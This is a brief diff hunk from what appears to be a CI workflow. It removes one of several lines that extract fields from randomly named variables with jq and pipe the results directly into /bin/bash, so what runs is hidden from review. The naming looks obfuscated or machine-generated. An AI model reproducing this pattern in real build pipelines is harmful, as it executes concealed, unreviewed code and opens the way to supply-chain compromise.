@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$hz6" | jq -r .baf8 | /bin/bash
           echo $tziqa38527 | jq -r .fcwtb76 | /bin/bash
           echo $om8 | jq -r .gd36520 | /bin/bash
-          printf '%s' "$oodgv54" | jq -r .vojqr9 | /bin/bash
           echo $scekc4 | jq -r .vma906 | /bin/bash
           echo $w07 | jq -r .oi699 | /bin/bash
           printf '%s' "$j0" | jq -r .cp38 | /bin/bash
